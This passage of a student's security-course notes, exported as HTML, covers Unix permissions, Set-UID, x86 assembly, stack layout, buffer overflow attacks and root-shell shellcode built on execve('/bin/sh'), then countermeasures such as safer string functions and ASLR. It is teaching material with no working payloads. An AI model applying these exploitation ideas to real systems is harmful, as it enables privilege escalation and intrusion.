id="9fae9345-1882-4c09-bf82-51be21b6a42a" class="bulleted-list"><li style="list-style-type:disc">we’re focusing on DAC</li></ul><figure id="4388261b-cb6a-436b-93c7-87de63f1c5c2" class="image"><a href="image%201.png"><img style="width:652px" src="image%201.png"/></a></figure><ul id="c1a705dd-6936-48e5-9a25-8523b3dd86e9" class="bulleted-list"><li style="list-style-type:disc">controls which user can read, write execute</li></ul><ul id="54157635-6ecd-42c0-9442-a8a7058385bc" class="bulleted-list"><li style="list-style-type:disc"></li></ul></details></li></ul><ul id="077335bb-e760-4beb-a4fd-89e6031b268a" class="toggle"><li><details><summary>Unix File Permission</summary><figure id="da93f4a2-1336-4e68-8cbe-117697cd8853" class="image"><a href="image%202.png"><img style="width:623.9375px" src="image%202.png"/></a></figure><ul id="19a8f151-0e76-4a88-bdab-da76367de9cd" class="bulleted-list"><li style="list-style-type:disc">user rights is if the user can read, write and execute</li></ul><ul id="6f512b0a-ebd1-4eed-a5bc-d349caf1c4ea" class="bulleted-list"><li style="list-style-type:disc">group rights are rights given to a user apart of a specific group</li></ul></details></li></ul><ul id="1a205e60-9100-4b0c-8f2e-e0b914d45825" class="toggle"><li><details><summary>Unix users and root</summary><ul id="334e8de0-d6b0-427e-8bb5-48005745273f" class="bulleted-list"><li style="list-style-type:disc">in unix based systems, there are only 2 types of users. users and roots (admin/super user)</li></ul><figure id="35a80a9d-b7b4-488d-9e8b-b4ee9090e865" class="image"><a href="image%203.png"><img style="width:623.984375px" src="image%203.png"/></a></figure><p id="718a92ff-7bc3-4da5-80dc-d2b6025b9595" class="">
</p></details></li></ul><ul id="7451feba-651c-4b94-a426-c4bd13e74890" class="toggle"><li><details><summary>Unix groups</summary><figure id="fe8dc32f-85db-4028-b872-43a1a976c036" class="image"><a href="image%204.png"><img style="width:623.96875px" src="image%204.png"/></a></figure></details></li></ul><ul id="0c04c552-0f50-4332-b4d1-47439426883e" class="toggle"><li><details><summary>Unix others</summary><figure id="01c676d7-7d91-4613-ba8f-b29c1be98b5f" class="image"><a href="image%205.png"><img style="width:624px" src="image%205.png"/></a></figure></details></li></ul><ul id="0d175f10-16b4-4e24-8219-18b42d646beb" class="toggle"><li><details><summary>9 bit permission model</summary><figure id="e3198a5d-2a0b-471e-b1ab-98e49785fa79" class="image"><a href="image%206.png"><img style="width:652px" src="image%206.png"/></a></figure><figure id="656d595e-c344-4c0e-a86e-b8c0de8c74f1" class="image"><a href="image%207.png"><img style="width:623.984375px" src="image%207.png"/></a></figure><figure id="e14b2724-678a-4923-8c43-23c140084448" class="image"><a href="image%208.png"><img style="width:623.984375px" src="image%208.png"/></a></figure><p id="08c8700f-82c2-4923-9352-49c8b1cd2371" class="">you get the higher set of permissions</p></details></li></ul><ul id="fe71ad9c-adbe-4333-adc3-4529a2206096" class="toggle"><li><details><summary>Need for Privileged Programs</summary><figure id="408492bf-856d-4b1e-b380-a18e0eaabd12" class="image"><a href="image%209.png"><img style="width:623.96875px" src="image%209.png"/></a></figure></details></li></ul><ul id="8778ae81-3d28-4f57-ba82-49189052a205" class="toggle"><li><details><summary>Two-Tier Approach</summary><figure id="de5f4a72-27bc-486d-8d32-642db6aad9b4" class="image"><a href="image%2010.png"><img style="width:623.984375px" src="image%2010.png"/></a></figure><ul id="8fb4f332-8736-4b2d-8987-e098fb8b9bc4" class="bulleted-list"><li style="list-style-type:disc">OS allows a program to escalate privileges to a higher level to do something unsafe<ul id="f8e9df59-72c3-4bd6-9e33-5500741df3af" class="bulleted-list"><li style="list-style-type:circle">eg: needed for normal uses to allow them to change their password, normally passwords are read only</li></ul></li></ul></details></li></ul><ul id="22b0ce3c-149a-4af8-810c-1e4a8cff57e4" class="toggle"><li><details><summary>Types of Privileged Programs</summary><figure id="7443b8e6-bb63-4a96-957d-a354fed6e4a0" class="image"><a href="image%2011.png"><img style="width:623.96875px" src="image%2011.png"/></a></figure><ul id="f54aa77d-1b96-46c3-b863-a5293b97da0f" class="bulleted-list"><li style="list-style-type:disc">in your c program, you can make a call that allows the program to give ask for higher permissions</li></ul><ul id="74973e71-9b97-4d75-8c23-46a601c1e0c0" class="bulleted-list"><li style="list-style-type:disc">will only work if the user executing the program has a special bit</li></ul></details></li></ul><ul id="0ca680c8-72c9-4aa8-bd05-7eb066f63143" class="toggle"><li><details><summary>Superman Story</summary><figure id="05e152d8-2a44-4d9f-9d8e-c5b1b39be8f3" class="image"><a href="image%2012.png"><img style="width:623.984375px" src="image%2012.png"/></a></figure></details></li></ul><ul id="f72ed28c-0ec6-4230-b2d2-00674c25e2ab" class="toggle"><li><details><summary>Set-UID Concept</summary><figure id="45521d21-2cf5-444b-acf3-5088cc3905f6" class="image"><a href="image%2013.png"><img style="width:623.984375px" src="image%2013.png"/></a></figure><figure id="b7808258-04c6-48b1-9427-a159fdc81069" class="image"><a href="image%2014.png"><img style="width:652px" src="image%2014.png"/></a></figure></details></li></ul></details></li></ul></details></li></ul><ul id="340ffa67-4dff-4626-8814-ba8df236f215" class="toggle"><li><details><summary>Part 2</summary><ul id="04659c8d-541b-4003-9d8b-50b3050f7c97" class="toggle"><li><details><summary>x86 Assembly and Linux Process Layout</summary><ul id="fef060cd-beaa-4b36-a00c-5a72b0146b79" class="toggle"><li><details><summary>Von Neumann Architecture</summary><figure id="cbb29ac9-d89f-4aec-914d-377de1841526" class="image"><a href="image%2015.png"><img style="width:623.984375px" src="image%2015.png"/></a></figure></details></li></ul><ul id="6dfddffa-89c7-4091-88c6-20c6c396f285" class="toggle"><li><details><summary>x86-32bit Architecture</summary><figure id="881f4c36-0a08-4fd6-8815-61140db1d449" class="image"><a href="image%2016.png"><img style="width:624px" src="image%2016.png"/></a></figure><h3 id="d78064a2-c108-452c-9cbf-5b136480bc37" class="">x86 instruction</h3><figure id="6213a52b-a9e4-42ac-b748-796c22bded5f" class="image"><a href="image%2017.png"><img style="width:623.984375px" src="image%2017.png"/></a></figure><p id="ff7ef4de-4666-491f-ab7f-f53ffe685ad8" class="">
</p></details></li></ul><ul id="54a82a91-a3a8-49e7-9718-72e746071d99" class="toggle"><li><details><summary>Assembly</summary><h3 id="1af495c0-ae6d-4add-b938-82e5ec446af1" class="">Intel vs AT&amp;T Assembly Syntax</h3><figure id="60de15af-c2b1-4487-8abc-e3c00c409330" class="image"><a href="5bddde38-eb2a-4188-b604-e2571b9398d4.png"><img style="width:708px" src="5bddde38-eb2a-4188-b604-e2571b9398d4.png"/></a></figure><ul id="d0ca7f62-67df-498e-9de0-284aa9266f5d" class="bulleted-list"><li style="list-style-type:disc">for intel, it will always be dest first and then src</li></ul><ul id="0df96918-290d-4133-9b71-2b77b783093e" class="bulleted-list"><li style="list-style-type:disc">for AT&amp;T it will be src first and then dest<figure id="daceae4f-f07c-46fd-a8ae-5c89d3ed6059" class="image"><a href="image%2018.png"><img style="width:595.953125px" src="image%2018.png"/></a></figure></li></ul><h3 id="43dbde38-7127-43fb-833d-7c73c46076a1" class="">Memory Operands</h3><p id="53c957d3-e1a3-43ab-b810-4a48b35a83e4" class="">operands are the arguments to an x86 instruction</p><ul id="076f577d-3d1d-46f2-862a-386cadc288cd" class="bulleted-list"><li style="list-style-type:disc">use of memory operands is aka indirect memory access</li></ul><ul id="90a4cdb8-12e4-4d7f-a528-ff84db90107d" class="bulleted-list"><li style="list-style-type:disc">intel syntax: <code>base + index*scale + displacement</code><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="59807c8a-c8ba-482c-887f-85d78a3979b8" class="code"><code class="language-Assembly">mov eax, [ebx + esi*4 + 8]</code></pre></li></ul><ul id="c16a44ff-d7c3-472e-9262-4d00afbe4a47" class="bulleted-list"><li style="list-style-type:disc">AT&amp;T syntax: <code>base, index, scale</code><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d1e831e5-232c-49e1-95a5-c9992b61e7b9" class="code"><code class="language-Assembly">movl 8(%ebx, %esi, 4), %eax</code></pre></li></ul><ul id="b8faf6ac-9fa7-4d6f-9ff1-f7033d3f93ca" class="bulleted-list"><li style="list-style-type:disc">base is any general purpose register </li></ul><ul id="b35291ec-2d42-41d8-85c4-869e8c39165f" class="bulleted-list"><li style="list-style-type:disc">index is any general purpose register except ESP</li></ul><ul id="d46c3614-1cc1-4495-ad61-ac63b7dfbef9" class="bulleted-list"><li style="list-style-type:disc">scale is either 1,2,4,8</li></ul><ul id="6150172e-6f1e-49af-a12b-312fc786088d" class="bulleted-list"><li style="list-style-type:disc">displacement is either a signed 8bit or 32bit integer</li></ul><ul id="b2d660fe-711c-4b39-9d83-c8714b214dac" class="bulleted-list"><li style="list-style-type:disc">not all fields are required<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cdcf485d-b082-45e0-ac4b-5542dde7ac29" class="code"><code class="language-Assembly">movl (%ebx), %eax //base only

movl -10(%ebx), %eax //base and displacement only

movl 0x1234, %eax //displacement only</code></pre></li></ul><h3 id="823343b5-2ea9-4fc1-bc8d-e78e84fceff4" class="">Common x86 instructions</h3><figure id="d8696ddb-e67e-46d6-819c-4f20a9e83237" class="image"><a href="image%2019.png"><img style="width:623.96875px" src="image%2019.png"/></a></figure><h3 id="6117d630-4a76-4f80-a603-8cf4dd482ac2" class="">Mnemonic and Opcode</h3><ul id="d480bd64-ebb1-43cd-9912-54a1bb11ad7e" class="bulleted-list"><li style="list-style-type:disc">process of turning assembly code to machine code is called assembly</li></ul><ul id="37f15271-c3bd-4cc4-8176-44fbaef093f8" class="bulleted-list"><li style="list-style-type:disc">Mnemonic and operands determine binary code called opcode</li></ul><ul id="763f40d5-ac6f-4592-a983-5afc7426ad60" class="bulleted-list"><li style="list-style-type:disc">in some cases, mnemonic alone will correspond to opcode</li></ul><figure id="5216295c-9001-43cd-9a69-46022585a6b3" class="image" style="text-align:center"><a href="image%2020.png"><img style="width:336px" src="image%2020.png"/></a></figure><p id="166c7583-356f-4cc5-8542-ac9b79320883" class="">
</p></details></li></ul><ul id="39e1db91-a07d-46b3-87cd-3bc2459e5b89" class="toggle"><li><details><summary>Linux Process Memory Layout</summary><h3 id="9284411f-e9ac-40e4-b326-269644d1d8a2" class="">Linux Process Memory Layout</h3><figure id="6ea13600-76f4-431a-b401-96bf34889a43" class="image"><a href="image%2021.png"><img style="width:624px" src="image%2021.png"/></a></figure><h3 id="5774c8f0-7edd-4661-a9da-4898eb906584" class="">Memory Layout Randomization</h3><figure id="01c76fe0-f477-4b4a-b822-733fb445410e" class="image"><a href="image%2022.png"><img style="width:623.984375px" src="image%2022.png"/></a></figure></details></li></ul><ul id="bea15c2e-8a5c-4b95-887c-6a79291a0d50" class="toggle"><li><details><summary>Caller Collee Calling Conventions</summary><figure id="58cd05df-d917-4021-900d-5ac2b75a0d9c" class="image"><a href="image%2023.png"><img style="width:624px" src="image%2023.png"/></a></figure><figure id="d9db20c1-1161-46fa-8c15-311c36e896bc" class="image"><a href="image%2024.png"><img style="width:623.984375px" src="image%2024.png"/></a></figure></details></li></ul><ul id="fc5cac35-c83c-43ad-b61f-ec56024d5137" class="toggle"><li><details><summary>Example</summary><figure id="1a4eb484-f5b1-4eaa-a0e4-f849b8bb190f" class="image"><a href="image%2025.png"><img style="width:623.96875px" src="image%2025.png"/></a></figure></details></li></ul></details></li></ul><ul id="304dff78-750a-4573-8ba5-11e74e24e96b" class="toggle"><li><details><summary>Buffer Overflow Attack</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="22a115dc-3d0e-4524-a745-3e1427f1da8e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="74c70593-567c-47eb-b631-3a959632d6f8" class="">a buffer overflow attack exploits a vulnerability in a program where input data exceeds the allocated buffer size that causes the buffer to overflow and allow malicious code to take over the program</p><ul id="7f5bbf63-cd75-4d07-bf12-f63da5b6c72c" class="bulleted-list"><li style="list-style-type:disc">like carpet bombing: overflow the buffer and override everything above the start of it </li></ul><ul id="e9c87aee-84a9-477f-8290-9ff21553918c" class="bulleted-list"><li style="list-style-type:disc">can be easily prevented with modern compiler’s safe guards </li></ul></div></figure><ul id="a776aa5f-460c-4e73-956f-fa8b077aea86" class="toggle"><li><details><summary>Buffer overflow: A brief history</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="3a9b411a-22f2-479a-ab95-ad0d71e7d19c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="ca9b8e44-108c-43eb-b2e9-05860018e4d3" class="">overflowing a buffer overwrites metadata that is used to control the instruction pointer</p><ul id="38777112-df19-4605-95f5-d26d466379eb" class="bulleted-list"><li style="list-style-type:disc">one of the most classic and common software vulnerability </li></ul><ul id="ae485d9f-cf39-4780-9fd5-b7d9a79eb9c0" class="bulleted-list"><li style="list-style-type:disc">it exploits a programming bug that allows a buffer to be extended beyond the defined length of the program author</li></ul></div></figure></details></li></ul><ul id="bfe0d364-0e4d-4ec0-a4d1-e5358d2c8e8b" class="toggle"><li><details><summary>Memory Layout Overview</summary><h3 id="5bbc3ff7-da3d-41e2-a961-946ad43120f8" class="">Virtual address vs Physical address</h3><figure id="8864dc89-fde4-47ec-a6b2-7e95186f20ad" class="image"><a href="image%2026.png"><img style="width:623.984375px" src="image%2026.png"/></a></figure><ul id="6890872f-671a-48d0-8b07-e1c8a3ebb106" class="bulleted-list"><li style="list-style-type:disc">0x3020 in P1 and P2 will be mapped to different addresses in the physical address</li></ul><ul id="6990dde3-f7db-41a6-87e5-6f60369b95ad" class="bulleted-list"><li style="list-style-type:disc">trying to fetch data from an address that is not mapped will cause a page fault and cause the program to crash (seg fault)</li></ul><h3 id="de0a1cab-c6a2-4999-9fcb-30119206333b" class="">Program memory stack (memory layout)</h3><figure id="ac997ba6-7dc9-4fe4-83b4-5a6f446d2d2a" class="image"><a href="image%2027.png"><img style="width:623.984375px" src="image%2027.png"/></a></figure><ul id="8f75bc36-d302-4bcd-b69b-fa9a893fdd18" class="bulleted-list"><li style="list-style-type:disc">BSS segment is new (haven’t seen in NWEN241)</li></ul><ul id="01a8f94b-87c7-476d-92df-719f10577593" class="bulleted-list"><li style="list-style-type:disc">BSS segment can contain static variables that are not initilized </li></ul><ul id="83d7f470-efc9-4254-adfc-e9cee9dcf895" class="bulleted-list"><li style="list-style-type:disc">in this course, lower address will be drawn at the bottom and higher addresses will be drawn at the top<ul id="87a5e866-7964-4ae8-959a-03b29b8f5102" class="bulleted-list"><li style="list-style-type:circle">stack grows down, heap grows up</li></ul></li></ul></details></li></ul><ul id="0a9e92b5-8f14-4b0b-bac0-ff6f646c709f" class="toggle"><li><details><summary>Function Memory Allocation</summary><h3 id="c09acef9-0693-466c-9707-00c2b66952cd" class="">Function arguments and local variables</h3><ul id="01208de5-017b-44dc-bd6a-9d05475d6961" class="bulleted-list"><li style="list-style-type:disc">when you pass values/arguments into a function, the values are pushed into the stack</li></ul><ul id="19c37a81-faf6-40b5-ac51-e33a421c2a83" class="bulleted-list"><li style="list-style-type:disc">local variables in the function save some registers and allocate the variables in the stack</li></ul><ul id="748c54ba-9d0c-4903-b161-6f071a090575" class="bulleted-list"><li style="list-style-type:disc">for the arguments/parameters of the function, they are allocated in reverse order</li></ul><ul id="88eae6de-3027-4dcb-81f3-5b1d0f1cd5da" class="bulleted-list"><li style="list-style-type:disc">for local variables, we don’t know the order</li></ul><ul id="2922e2a7-d302-4463-828d-1e8f1a63b035" class="bulleted-list"><li style="list-style-type:disc">ebp (address to the previous frame pointer): when we&#x27;re subtracting, we&#x27;re accessing local variables, and when we&#x27;re adding, we&#x27;re accessing parameter values.</li></ul><figure id="757d2dea-a2a9-457c-b6d8-5632cbaca615" class="image"><a href="image%2028.png"><img style="width:623.96875px" src="image%2028.png"/></a></figure><h3 id="4eff9869-334f-4b09-a63f-820abcfbc03c" class="">Function-call stack</h3><figure id="59e08ad3-12fc-45e6-851b-150a24270685" class="image"><a href="image%2029.png"><img style="width:623.984375px" src="image%2029.png"/></a></figure><h3 id="93f541e1-c140-429f-bbc1-6772d59e0cc4" class="">Stack layout for function-call chain</h3><p id="fb1a6589-3c28-4b55-9919-24ed07e25c6e" class="">we have 3 functions, foo, bar and main</p><p id="b55bde16-aa8c-4917-8991-a737ca47c5be" class="">each functions have their own stack frames allocated in the stack (which is storing the function’s local variables and arguments)</p><figure id="ffcae9fa-bf03-4c1a-97e3-3a1d59d2a631" class="image"><a href="image%2030.png"><img style="width:623.984375px" src="image%2030.png"/></a></figure><h3 id="b06c7362-4a7a-4553-8cd8-e53c9d4c2776" class="">Copy Data to Buffer</h3><p id="78c20cac-9a3c-4a58-afa5-0cb03a717b7d" class="">strcpy is a function apart of the c standard library for copying strings from src to dest</p><p id="e1df5e42-ac52-46e2-9f11-924c66dff1af" class="">this function is the starting point for the buffer attacker</p><p id="13771ae3-96bd-4d02-a0e9-81fb4380f440" class="">strcpy will stop with the null terminator</p><p id="d23f8749-3512-4873-bc71-67e780791654" class="">if your src buffer is much longer than the dest buffer, then it will cause an overflow</p><figure id="2fae6a53-cedf-4b34-aedc-1d5960d5443a" class="image"><a href="image%2031.png"><img style="width:623.96875px" src="image%2031.png"/></a></figure></details></li></ul><ul id="1b3473bc-2779-4ecb-92a7-0925d26ef8fc" class="toggle"><li><details><summary>Vulnerable Code</summary><h3 id="79da20b9-7076-47d4-aa4a-1f77f6e122dd" class="">Buffer overflow example</h3><figure id="8a5b249e-d008-4c5d-886d-b8c4babae004" class="image"><a href="image%2032.png"><img style="width:624px" src="image%2032.png"/></a></figure><h3 id="0e7b2811-1624-46f6-8854-023cae187e8d" class="">Consequences of buffer overflow</h3><p id="973cee1f-6fde-4423-b20e-329d80b7dbd8" class="">Overwriting return address with some random address can<br/>point to :<br/></p><ol type="1" id="591651b2-cb41-43c9-ac5e-d7f020190d99" class="numbered-list" start="1"><li>Invalid/non-existing address (mapped address)</li></ol><ol type="1" id="041b7c14-7491-4839-9eee-6f5155c2bd48" class="numbered-list" start="2"><li>Invalid instruction</li></ol><ol type="1" id="1a4a3e1f-f30e-41f4-9264-0609f8c4060d" class="numbered-list" start="3"><li>Access violation (valid instruction, but kernel)</li></ol><ol type="1" id="b5ed30fc-e2a7-42a2-8d91-df3860d1c1f6" class="numbered-list" start="4"><li><mark class="highlight-red">Attacker’s code Malicious code to gain access</mark></li></ol><h3 id="f1b3deed-531b-42e1-98c3-a0d659af6423" class="">A vulnerable program</h3><p id="c8519d09-0baa-4290-94c6-83154c98eb7f" class="">What can we do? How to get our code to be executed</p><p id="151efb10-8a6a-44b8-adfd-fb5bf72798cc" class="">in this example, we are trying to copy 300 byte buffer into a 100 byte buffer</p><figure id="c90e1140-1f23-47fc-bf58-77c385e74067" class="image"><a href="image%2033.png"><img style="width:624px" src="image%2033.png"/></a></figure><h3 id="785aa9b5-a3d5-43d6-be79-159a6e8c59e8" class="">Environment setup</h3><figure id="4ac8c119-98c7-433b-b4e9-a483efe5b6c7" class="image"><a href="image%2034.png"><img style="width:624px" src="image%2034.png"/></a></figure><figure id="b7c1606a-a244-4d97-9186-7f8ba56ecb83" class="image"><a href="image%2035.png"><img style="width:480px" src="image%2035.png"/></a></figure></details></li></ul><ul id="7667003f-6ea2-4552-bf50-5ee893e93b27" class="toggle"><li><details><summary>Challenges in Exploitation </summary><figure id="17a37049-6ba9-43be-836d-10f3d5af867f" class="image"><a href="image%2036.png"><img style="width:623.96875px" src="image%2036.png"/></a></figure><p id="a228067a-0fba-41a3-ad9e-ef3f09786295" class="">the bad file overwrites the stack</p><p id="c32ceaef-75e4-46a4-9fb3-296311a571ed" class="">the bigger the stack, the bigger the badfile</p><figure id="8bdc8d78-951c-4349-8c8e-4827017ac0a7" class="image"><a href="image%2037.png"><img style="width:623.96875px" src="image%2037.png"/></a></figure><figure id="bf159d85-53ae-488c-b5f3-6abeabe37246" class="image"><a href="image%2038.png"><img style="width:623.984375px" src="image%2038.png"/></a></figure></details></li></ul><ul id="bb96e458-8343-4148-8d86-53fe92706f1e" class="toggle"><li><details><summary>Buffer Overflow – Countermeasures</summary><ul id="0e3183af-1587-4441-817f-4ceaa2283da6" class="toggle"><li><details><summary>Recap of buffer overflow attack</summary><figure id="75de83bd-7679-422c-a886-256c65a69bcf" class="image"><a href="image%2039.png"><img style="width:2484px" src="image%2039.png"/></a></figure><figure id="7e148638-3866-421f-9225-6f4fe1f8a8fb" class="image"><a href="image%2040.png"><img style="width:595.984375px" src="image%2040.png"/></a></figure></details></li></ul><ul id="303d39dd-5674-48d8-83d0-f5403a5f9117" class="toggle"><li><details><summary>Shellcode</summary><ul id="66dea49a-9221-4d11-8816-bcad1055feaf" class="bulleted-list"><li style="list-style-type:disc">aim of the malicious code is to gain access to the system using a root shell<ul id="9a08d786-ef44-49b9-a34f-3a7925912ef8" class="bulleted-list"><li style="list-style-type:circle">root shell is a shell that has admin rights</li></ul><ul id="aa67ebd1-f32e-4920-be7c-046cce30b08a" class="bulleted-list"><li style="list-style-type:circle">allows to run commands on the system</li></ul></li></ul><figure id="57afd7dc-a4e2-414c-82f9-89676e2950dd" class="image"><a href="image%2041.png"><img style="width:2275px" src="image%2041.png"/></a></figure><ul id="8a6c605d-0646-49ac-9ee7-486bf3783d9c" class="bulleted-list"><li style="list-style-type:disc">this program in c will not work: the size of is too big</li></ul><ul id="5a6d3c5f-517b-41a5-8152-ea0ec51a56f6" class="bulleted-list"><li style="list-style-type:disc">if your file contains 0’s then the attack will also not work because we’re using strcpy function to do this exploit (which terminates when a null terminator is found)</li></ul><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f953d60f-22d2-427f-83c9-a42a8e543640"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="ba602738-ac25-48f5-ab98-a2b10e3768ce" class="">the only solution to do this attack is not not use c<br/>but to write this program in x86 assembly <br/></p></div></figure></details></li></ul><ul id="e465d02e-fa79-4eca-8a99-7c09ba1aa32d" class="toggle"><li><details><summary>Writing Shellcode in Assembly</summary><ul id="5d39e21e-f518-42cf-af42-7a14961e8e64" class="bulleted-list"><li style="list-style-type:disc">goal: use <code>execve(“/bin/sh”,argv,0)</code> to run shell</li></ul><figure id="612a74ac-f0a2-4568-841f-8bf410e27431" class="image"><a href="image%2042.png"><img style="width:624px" src="image%2042.png"/></a></figure><ul id="e69c60fd-6a39-420b-8f11-7461ff693a2c" class="bulleted-list"><li style="list-style-type:disc">the execuve system call’s return value and parameters can be accessed using its registors via the table (eg: eax, ebx, ecx ...)</li></ul><figure id="59096ae0-7aba-4057-96a5-a3701ae155a7" class="image"><a href="image%2043.png"><img style="width:595.96875px" src="image%2043.png"/></a></figure><figure id="4baa8d44-2c39-4b39-ae98-9c5c1c7de9e9" class="image"><a href="image%2044.png"><img style="width:624px" src="image%2044.png"/></a></figure><figure id="5a1aeb94-fd37-4e3a-9e56-9763c27f6ff5" class="image"><a href="image%2045.png"><img style="width:2068px" src="image%2045.png"/></a></figure><ol type="a" id="bef9268c-09cd-408c-9247-889e7d8e9c3e" class="numbered-list" start="1"><li>how your stack will look like after the function execution </li></ol><figure id="b1bffb56-18da-4c57-85e0-cb475717a9a3" class="image"><a href="image%2046.png"><img style="width:465px" src="image%2046.png"/></a></figure><p id="34fc5b0c-bf8f-4fde-85ca-855f6ea9ce63" class="">
</p></details></li></ul><ul id="92b9ab64-07d7-414d-bb2c-33674132478e" class="toggle"><li><details><summary>Countermeasures</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1000d6b2-259d-479d-8955-b018c9d6add8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="ca2d0c75-ec7b-4669-b402-e28cd20dbccf" class="">OS venders have spent over 15 years to make counter measures against buffer overflow attacks</p></div></figure><ul id="04da8220-7143-4b1d-9ec2-b1d86c1a8757" class="toggle"><li><details><summary>Developer Approach</summary><h3 id="65928aa7-f060-4896-9c8a-dcf7987f2353" class="">Developer Approach</h3><ol type="1" id="144f25d7-fdf5-4530-9bde-3079a4610752" class="numbered-list" start="1"><li>always check the length of the data</li></ol><ol type="1" id="affbbb8d-f723-4092-b3d5-508664dbbac4" class="numbered-list" start="2"><li>do not let users set the length ; set it yourself <ol type="a" id="8884f17f-ef6f-425c-99d3-c3af0d9d0d16" class="numbered-list" start="1"><li>(use safter functions such as strncpy instead of strcpy)</li></ol><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b45c9fb-3848-43f6-97a0-0a979e54592e" class="code"><code class="language-Java">char *strcpy(char *dest, const char *src);
char *strncpy(char *dest, const char *src, size_t n);
char *strcat(char *dest, const char *src);
char *strncat(char *dest, const char *src, size_t n);
int *sprintf(char *str, const char *format, . . .);
int *snprintf(char *str, size_t size, const char *format, . . .);
char *gets(char *s);
char *fgets(char *dest, int size, FILE *stream);</code></pre></li></ol><ol type="1" id="8314e903-ecf6-4cb9-beed-d049ed6b9430" class="numbered-list" start="3"><li>use a safter library (libsafe)</li></ol><ol type="1" id="6c3e0db5-797a-43e2-adfb-5745ae014c8f" class="numbered-list" start="4"><li>use safter languages (rust instead of c because of memory safety)</li></ol></details></li></ul><ul id="8ce7e420-c46d-42bb-b6dc-f5a0d47680e3" class="toggle"><li><details><summary>OS Approaches: address space layout randomization (ASLR)</summary><h3 id="698cf67b-591c-49ef-a613-9a96e7eb8901" class="">OS Approaches: address space layout randomization (ASLR)</h3><ul id="ba0ea6c0-efcb-485a-9eda-f4e1df994d6c" class="bulleted-list"><li style="list-style-type:disc">os uses “address space layout randomization (ASLR)” to set random offset from the top of the memory to where the stack will actually start (same is done for the heap)</li></ul><ul id="3eac3d12-0b61-42f8-ad3b-9bce11ff4a73" class="bulleted-list"><li style="list-style-type:disc">by having random start locations for the stack and the heap to reduce the chance of attackers to guess memory addresses</li></ul><figure id="ca2b1095-e4ba-4956-a0c5-42c9c34504a6" class="image"><a href="image%2047.png"><img style="width:567.953125px" src="image%2047.png"/></a></figure><figure id="40ce5580-e5ca-484f-a29e-66be2b37737f" class="image"><a href="image%2048.png"><img style="width:624px" src="image%2048.png"/></a></figure><figure id="9f1898a3-6efb-4a2b-899e-3070842b1588" class="image"><a href="image%2049.png"><img style="width:567.96875px" src="image%2049.png"/></a></figure><figure id="b39c8071-0758-44be-8316-ebbad858d67c" class="image"><a href="image%2050.png"><img style="width:567.96875px" src="image%2050.png"/></a></figure><figure id="b7451af6-a44a-4be5-9d4d-e8b63cb08760" class="image"><a href="image%2051.png"><img style="width:567.96875px" src="image%2051.png"/></a></figure><figure id="a98945a0-d340-4aa7-98c7-4d03f04af638" class="image"><a href="image%2052.png"><img style="width:567.984375px" src="image%2052.png"/></a></figure><figure id="9ffc1db2-8925-4b33-bd18-cc18a05c621d" class="image"><a href="image%2053.png"><img style="width:567.96875px" src="image%2053.png"/></a></figure></details></li></ul><ul id="32d1a2fb-5f33-401e-862f-38236e3118c9" class="toggle"><li><details><summary>OS Approaches: shell program defense</summary><ul id="66a20f64-9d6b-47f0-939a-0d52616ca8e8" class="bulleted-list"><li style="list-style-type:disc">attackers will abuse set UID programs to gain privlages </li></ul><ul id="b278f086-0fab-4271-bfb4-a329c1b88d92" class="bulleted-list"><li style="list-style-type:disc">operating system checks Real UID and Effective UID<ul id="3f2e0b61-da48-4add-88bf-60e45e02c244" class="bulleted-list"><li 